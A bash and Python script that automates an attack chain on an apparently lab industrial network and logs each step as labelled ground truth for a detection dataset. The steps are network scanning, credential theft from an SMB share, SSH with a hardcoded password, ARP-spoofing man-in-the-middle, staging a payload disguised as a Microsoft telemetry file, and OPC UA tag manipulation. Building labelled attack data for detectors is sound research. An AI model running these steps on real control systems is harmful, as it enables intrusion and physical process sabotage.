#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ARTIFACT_ROOT="$ROOT_DIR/artifacts/scenario-runs"
STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
SCENARIO_ID="${1:-showcase-storyline-$STAMP}"
OUT_DIR="$ARTIFACT_ROOT/$SCENARIO_ID"
MANIFEST="$OUT_DIR/ground_truth.jsonl"

EWS_HOST="${EWS_HOST:-192.168.1.5}"
EWS_USER="${EWS_USER:-john}"
EWS_PASSWORD="${EWS_PASSWORD:-Cisco}"
SMB_TARGET="${SMB_TARGET:-192.168.1.7}"
HISTORIAN_HOST="${HISTORIAN_HOST:-192.168.1.10}"
OPCUA_HOST="${OPCUA_HOST:-192.168.1.11}"
REMOTE_TOOL_PATH="${REMOTE_TOOL_PATH:-C:\\Users\\john\\AppData\\Local\\Microsoft\\Diagnosis\\Downloads\\telemetry_sync_cache.py}"

mkdir -p "$OUT_DIR"

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[storyline] missing command: $1" >&2
    exit 1
  }
}

for cmd in python3 sshpass smbclient nmap curl scp ssh; do
  require_cmd "$cmd"
done

record_step() {
  python3 - "$MANIFEST" "$SCENARIO_ID" "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9" "${10}" "${11}" "${12}" "${13}" <<'PY'
import json
import sys

record = {
    "scenario_id": sys.argv[2],
    "session_id": sys.argv[2],
    "scenario_family": "streamlit_storyline_replay",
    "ground_truth_label": "attack",
    "dataset_split": "ml_live_labeled",
    "telemetry_origin": "live_sensor",
    "session_intent": "ot_impact",
    "session_danger_label": "critical",
    "session_summary": "Full Streamlit storyline replayed with reliable MITM and staged OT tool paths.",
    "scenario_step": sys.argv[3],
    "attack_label": sys.argv[4],
    "attack_stage": sys.argv[5],
    "asset_class": sys.argv[6],
    "mitre_technique": sys.argv[7],
    "source_asset": sys.argv[8],
    "target_asset": sys.argv[9],
    "event_kind": sys.argv[10],
    "start_ts_epoch": float(sys.argv[11]),
    "end_ts_epoch": float(sys.argv[12]),
    "exit_code": int(sys.argv[13]),
    "command": sys.argv[14],
    "output_file": sys.argv[15],
}
with open(sys.argv[1], "a", encoding="utf-8") as fh:
    fh.write(json.dumps(record, ensure_ascii=True) + "\n")
PY
}

run_local() {
  local step="$1" label="$2" stage="$3" asset="$4" mitre="$5" src="$6" dst="$7" kind="$8" cmd="$9" outfile="${10}"
  local start_ts end_ts rc
  start_ts="$(python3 - <<'PY'
import time
print(time.time())
PY
)"
  if timeout 240 bash -lc "$cmd" >"$outfile" 2>&1; then
    rc=0
  else
    rc=$?
  fi
  end_ts="$(python3 - <<'PY'
import time
print(time.time())
PY
)"
  record_step "$step" "$label" "$stage" "$asset" "$mitre" "$src" "$dst" "$kind" "$start_ts" "$end_ts" "$rc" "$cmd" "$outfile"
  printf '[storyline] %s exit=%s\n' "$step" "$rc"
}

run_ews() {
  local step="$1" label="$2" stage="$3" asset="$4" mitre="$5" src="$6" dst="$7" kind="$8" remote_cmd="$9" outfile="${10}" tty="${11:-0}"
  local start_ts end_ts rc
  start_ts="$(python3 - <<'PY'
import time
print(time.time())
PY
)"
  if [[ "$tty" == "1" ]]; then
    if timeout 240 sshpass -p "$EWS_PASSWORD" ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$EWS_USER@$EWS_HOST" "$remote_cmd" >"$outfile" 2>&1; then
      rc=0
    else
      rc=$?
    fi
  else
    if timeout 240 sshpass -p "$EWS_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$EWS_USER@$EWS_HOST" "$remote_cmd" >"$outfile" 2>&1; then
      rc=0
    else
      rc=$?
    fi
  fi
  end_ts="$(python3 - <<'PY'
import time
print(time.time())
PY
)"
  record_step "$step" "$label" "$stage" "$asset" "$mitre" "$src" "$dst" "$kind" "$start_ts" "$end_ts" "$rc" "$remote_cmd" "$outfile"
  printf '[storyline] %s exit=%s\n' "$step" "$rc"
}

python3 - <<'PY' >"$OUT_DIR/storyline_cmds.env"
from pathlib import Path
from demos.streamlit_demo import (
    OPCUA_ENDPOINT,
    MANIPULATE_SCRIPT,
    build_manipulation_exec,
    build_opc_probe_exec,
)
def emit(name: str, value: str) -> None:
    print(f"{name}=$(cat <<'EOF'\n{value}\nEOF\n)")
emit("STEP6_CMD", build_opc_probe_exec("192.168.1.11", 4840))
emit("STEP8_CMD", build_manipulation_exec(OPCUA_ENDPOINT, MANIPULATE_SCRIPT))
PY
source "$OUT_DIR/storyline_cmds.env"

run_local \
  "step_1_initial_foothold" \
  "foothold" \
  "benign_access" \
  "workstation" \
  "T0866" \
  "monitoring_laptop" \
  "monitoring_laptop" \
  "shell_command" \
  "hostname && whoami" \
  "$OUT_DIR/step1.txt"

run_local \
  "step_2_service_discovery" \
  "discovery" \
  "discovery" \
  "network" \
  "T0846" \
  "monitoring_laptop" \
  "level3_subnet" \
  "scan" \
  "nmap --open -T4 --max-retries 1 --host-timeout 12s -p 22,80,139,443,445,3389,4840,5000,3000 192.168.1.0/24" \
  "$OUT_DIR/step2.txt"

run_local \
  "step_3_smb_credential_discovery" \
  "collection" \
  "smb_access" \
  "smb" \
  "T0811" \
  "monitoring_laptop" \
  "smb" \
  "smb_browse" \
  "smbclient -L //$SMB_TARGET -N && smbclient //$SMB_TARGET/Operations -N -c \"ls\" && smbclient //$SMB_TARGET/Operations -N -c \"get shift_notes.txt /tmp/shift_notes.txt\" && cat /tmp/shift_notes.txt && smbclient //$SMB_TARGET/Operations -N -c \"get ews_maintenance_access.txt /tmp/ews_access.txt\" && cat /tmp/ews_access.txt" \
  "$OUT_DIR/step3.txt"

run_ews \
  "step_4_ews_access" \
  "lateral_movement" \
  "host_activity" \
  "ews" \
  "T0866" \
  "monitoring_laptop" \
  "ews" \
  "ssh_session" \
  'cmd /c "hostname && whoami"' \
  "$OUT_DIR/step4.txt"

run_ews \
  "step_5_historian_access" \
  "collection" \
  "historian_web" \
  "historian" \
  "T0802" \
  "ews" \
  "historian" \
  "http_request" \
  "cmd /c \"curl -s -c C:\\Users\\john\\Downloads\\hist.cookies -X POST -d username=john -d password=Cisco http://$HISTORIAN_HOST:5000/login >nul && curl -s -b C:\\Users\\john\\Downloads\\hist.cookies http://$HISTORIAN_HOST:5000/portal/history?tag=weld_cell_temperature_c\"" \
  "$OUT_DIR/step5.txt"

run_ews \
  "step_6_opcua_probe" \
  "recon" \
  "opcua_path" \
  "opcua" \
  "T0861" \
  "ews" \
  "opcua" \
  "tcp_probe" \
  "$STEP6_CMD" \
  "$OUT_DIR/step6.txt"

run_ews \
  "step_7_arp_mitm_list" \
  "reconnaissance" \
  "host_command" \
  "ews" \
  "T0830" \
  "ews" \
  "historian_opcua" \
  "host_command" \
  'cmd /c "C:\Users\john\Downloads\arpspoof.exe --list"' \
  "$OUT_DIR/step7_list.txt" \
  "1"

python3 - "$OUT_DIR" "$MANIFEST" "$SCENARIO_ID" "$EWS_HOST" "$EWS_USER" "$EWS_PASSWORD" <<'PY'
import json
import os
import signal
import subprocess
import sys
import time
from pathlib import Path

from demos.streamlit_demo import build_arpspoof_managed_launch

out_dir = Path(sys.argv[1])
manifest = Path(sys.argv[2])
scenario_id = sys.argv[3]
ews_host = sys.argv[4]
ews_user = sys.argv[5]
ews_password = sys.argv[6]
remote_runtime_log = r"C:\Users\john\AppData\Local\Temp\arpspoof_runtime.log"

stream_path = out_dir / "step7_mitm_stream.txt"
check_path = out_dir / "step7_check.txt"
stop_path = out_dir / "step7_stop.txt"

launch_cmd = [
    "sshpass",
    "-p",
    ews_password,
    "ssh",
    "-o",
    "StrictHostKeyChecking=no",
    "-o",
    "UserKnownHostsFile=/dev/null",
    f"{ews_user}@{ews_host}",
    build_arpspoof_managed_launch(
        r"C:\Users\john\Downloads\arpspoof.exe",
        "",
        "192.168.1.10",
        "192.168.1.11",
        remote_runtime_log,
    ),
]
check_cmd = [
    "sshpass",
    "-p",
    ews_password,
    "ssh",
    "-o",
    "StrictHostKeyChecking=no",
    "-o",
    "UserKnownHostsFile=/dev/null",
    f"{ews_user}@{ews_host}",
    "powershell -NoProfile -Command \"$p = Get-Process arpspoof -ErrorAction SilentlyContinue | Select-Object -First 1; if ($null -eq $p) { Write-Output 'ARPSPOOF_NOT_RUNNING'; exit 1 }; Write-Output ('ARPSPOOF_RUNNING PID=' + $p.Id); exit 0\"",
]
stop_cmd = [
    "sshpass",
    "-p",
    ews_password,
    "ssh",
    "-o",
    "StrictHostKeyChecking=no",
    "-o",
    "UserKnownHostsFile=/dev/null",
    f"{ews_user}@{ews_host}",
    'cmd /c "taskkill /F /IM arpspoof.exe"',
]

start_ts = time.time()
with stream_path.open("w", encoding="utf-8") as log_fh:
    proc = subprocess.Popen(
        launch_cmd,
        stdout=log_fh,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )
time.sleep(3)
check_proc = subprocess.run(check_cmd, capture_output=True, text=True, timeout=30)
check_output = ((check_proc.stdout or "") + ("\n" + check_proc.stderr if check_proc.stderr else "")).strip()
check_path.write_text(check_output + "\n", encoding="utf-8")
rc = check_proc.returncode
end_ts = time.time()
record = {
    "scenario_id": scenario_id,
    "session_id": scenario_id,
    "scenario_family": "streamlit_storyline_replay",
    "ground_truth_label": "attack",
    "dataset_split": "ml_live_labeled",
    "telemetry_origin": "live_sensor",
    "session_intent": "ot_impact",
    "session_danger_label": "critical",
    "session_summary": "Full Streamlit storyline replayed with reliable MITM and staged OT tool paths.",
    "scenario_step": "step_7_arp_mitm_launch",
    "attack_label": "reconnaissance",
    "attack_stage": "host_command",
    "asset_class": "ews",
    "mitre_technique": "T0830",
    "source_asset": "ews",
    "target_asset": "historian_opcua",
    "event_kind": "mitm_command",
    "start_ts_epoch": start_ts,
    "end_ts_epoch": end_ts,
    "exit_code": rc,
    "command": "ssh-held foreground arpspoof on EWS",
    "output_file": str(check_path),
}
with manifest.open("a", encoding="utf-8") as fh:
    fh.write(json.dumps(record, ensure_ascii=True) + "\n")
print(f"[storyline] step_7_arp_mitm_launch exit={rc}")

stop_proc = subprocess.run(stop_cmd, capture_output=True, text=True, timeout=30)
stop_output = ((stop_proc.stdout or "") + ("\n" + stop_proc.stderr if stop_proc.stderr else "")).strip()
stop_path.write_text(stop_output + "\n", encoding="utf-8")
try:
    os.killpg(proc.pid, signal.SIGTERM)
except ProcessLookupError:
    pass
try:
    proc.wait(timeout=5)
except subprocess.TimeoutExpired:
    pass
PY

python3 - "$OUT_DIR" "$MANIFEST" "$SCENARIO_ID" "$EWS_HOST" "$EWS_USER" "$EWS_PASSWORD" "$REMOTE_TOOL_PATH" <<'PY'
import json
import subprocess
import sys
import time
from pathlib import Path

from demos.streamlit_demo import build_manipulation_exec, MANIPULATE_SCRIPT, OPCUA_ENDPOINT

out_dir = Path(sys.argv[1])
manifest = Path(sys.argv[2])
scenario_id = sys.argv[3]
ews_host = sys.argv[4]
ews_user = sys.argv[5]
ews_password = sys.argv[6]
remote_tool_path = sys.argv[7]

stage_path = out_dir / "step8_stage.txt"
run_path = out_dir / "step8.txt"

prep_cmd = [
    "sshpass",
    "-p",
    ews_password,
    "ssh",
    "-o",
    "StrictHostKeyChecking=no",
    "-o",
    "UserKnownHostsFile=/dev/null",
    f"{ews_user}@{ews_host}",
    "powershell -NoProfile -Command \"$dest='C:\\Users\\john\\AppData\\Local\\Microsoft\\Diagnosis\\Downloads\\telemetry_sync_cache.py'; $dir=Split-Path -Parent $dest; New-Item -ItemType Directory -Force -Path $dir | Out-Null; if (Test-Path $dest) { attrib -h -r $dest > $null 2>&1; Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue }\"",
]
scp_cmd = [
    "sshpass",
    "-p",
    ews_password,
    "scp",
    "-q",
    "-o",
    "StrictHostKeyChecking=no",
    "-o",
    "UserKnownHostsFile=/dev/null",
    str(Path("demos/payloads/telemetry_sync_cache.py").resolve()),
    f"{ews_user}@{ews_host}:/C:/Users/john/AppData/Local/Microsoft/Diagnosis/Downloads/telemetry_sync_cache.py",
]
start_ts = time.time()
prep = subprocess.run(prep_cmd, capture_output=True, text=True, timeout=60)
scp = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
stage_output = ((prep.stdout or "") + ("\n" + prep.stderr if prep.stderr else "") + (scp.stdout or "") + ("\n" + scp.stderr if scp.stderr else "")).strip()
stage_path.write_text(stage_output + "\n", encoding="utf-8")
stage_rc = 0 if prep.returncode == 0 and scp.returncode == 0 else (scp.returncode or prep.returncode)
end_ts = time.time()
stage_record = {
    "scenario_id": scenario_id,
    "session_id": scenario_id,
    "scenario_family": "streamlit_storyline_replay",
    "ground_truth_label": "attack",
    "dataset_split": "ml_live_labeled",
    "telemetry_origin": "live_sensor",
    "session_intent": "ot_impact",
    "session_danger_label": "critical",
    "session_summary": "Full Streamlit storyline replayed with reliable MITM and staged OT tool paths.",
    "scenario_step": "step_8_stage_payload",
    "attack_label": "impact",
    "attack_stage": "host_command",
    "asset_class": "ews",
    "mitre_technique": "T0831",
    "source_asset": "monitoring_laptop",
    "target_asset": "ews",
    "event_kind": "file_stage",
    "start_ts_epoch": start_ts,
    "end_ts_epoch": end_ts,
    "exit_code": stage_rc,
    "command": "stage telemetry_sync_cache.py via ssh+scp to EWS",
    "output_file": str(stage_path),
}
with manifest.open("a", encoding="utf-8") as fh:
    fh.write(json.dumps(stage_record, ensure_ascii=True) + "\n")
print(f"[storyline] step_8_stage_payload exit={stage_rc}")

run_cmd = [
    "sshpass",
    "-p",
    ews_password,
    "ssh",
    "-o",
    "StrictHostKeyChecking=no",
    "-o",
    "UserKnownHostsFile=/dev/null",
    f"{ews_user}@{ews_host}",
    build_manipulation_exec(OPCUA_ENDPOINT, MANIPULATE_SCRIPT),
]
start_ts = time.time()
run_proc = subprocess.run(run_cmd, capture_output=True, text=True, timeout=240)
run_output = ((run_proc.stdout or "") + ("\n" + run_proc.stderr if run_proc.stderr else "")).strip()
run_path.write_text(run_output + "\n", encoding="utf-8")
end_ts = time.time()
run_record = {
    "scenario_id": scenario_id,
    "session_id": scenario_id,
    "scenario_family": "streamlit_storyline_replay",
    "ground_truth_label": "attack",
    "dataset_split": "ml_live_labeled",
    "telemetry_origin": "live_sensor",
    "session_intent": "ot_impact",
    "session_danger_label": "critical",
    "session_summary": "Full Streamlit storyline replayed with reliable MITM and staged OT tool paths.",
    "scenario_step": "step_8_tag_manipulation",
    "attack_label": "impact",
    "attack_stage": "opcua_write",
    "asset_class": "opcua",
    "mitre_technique": "T0831",
    "source_asset": "ews",
    "target_asset": "opcua",
    "event_kind": "execution",
    "start_ts_epoch": start_ts,
    "end_ts_epoch": end_ts,
    "exit_code": run_proc.returncode,
    "command": build_manipulation_exec(OPCUA_ENDPOINT, MANIPULATE_SCRIPT),
    "output_file": str(run_path),
}
with manifest.open("a", encoding="utf-8") as fh:
    fh.write(json.dumps(run_record, ensure_ascii=True) + "\n")
print(f"[storyline] step_8_tag_manipulation exit={run_proc.returncode}")
PY

echo "$SCENARIO_ID"
